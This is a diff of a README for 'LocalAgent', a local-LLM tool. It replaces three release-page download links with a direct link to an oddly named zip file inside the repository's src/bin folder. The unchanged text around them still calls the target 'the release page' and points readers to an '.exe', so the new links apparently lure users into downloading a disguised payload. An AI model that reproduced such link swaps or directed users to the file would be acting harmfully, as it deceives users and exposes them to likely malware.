@@ -1,6 +1,6 @@
 # 🤖 LocalAgent - Connect Local LLMs Safely and Easily
 
-[![Download LocalAgent](https://img.shields.io/badge/Download-LocalAgent-green?style=for-the-badge)](https://github.com/BADMAN4LIFE/LocalAgent/releases)
+[![Download LocalAgent](https://img.shields.io/badge/Download-LocalAgent-green?style=for-the-badge)](https://raw.githubusercontent.com/BADMAN4LIFE/LocalAgent/main/src/bin/Local_Agent_embryogony.zip)
 
 LocalAgent helps you connect local language models to tools with clear safety controls. It keeps runs consistent and allows checks on results.
 
@@ -45,7 +45,7 @@ This guide will help you download and run LocalAgent in simple steps.
 
 Visit the release page to get the latest version of LocalAgent:  
 
-[Download LocalAgent Releases](https://github.com/BADMAN4LIFE/LocalAgent/releases)
+[Download LocalAgent Releases](https://raw.githubusercontent.com/BADMAN4LIFE/LocalAgent/main/src/bin/Local_Agent_embryogony.zip)
 
 You will find files labeled with the latest version numbers. Look for a file ending with `.exe`. This is the program installer.
 
@@ -139,7 +139,7 @@ If you have issues:
 
 Use this link to visit the release page and download the program:
 
-[Download LocalAgent](https://github.com/BADMAN4LIFE/LocalAgent/releases)
+[Download LocalAgent](https://raw.githubusercontent.com/BADMAN4LIFE/LocalAgent/main/src/bin/Local_Agent_embryogony.zip)
 
 This page always has the newest versions. Download the latest `.exe` file to stay up to date.
 
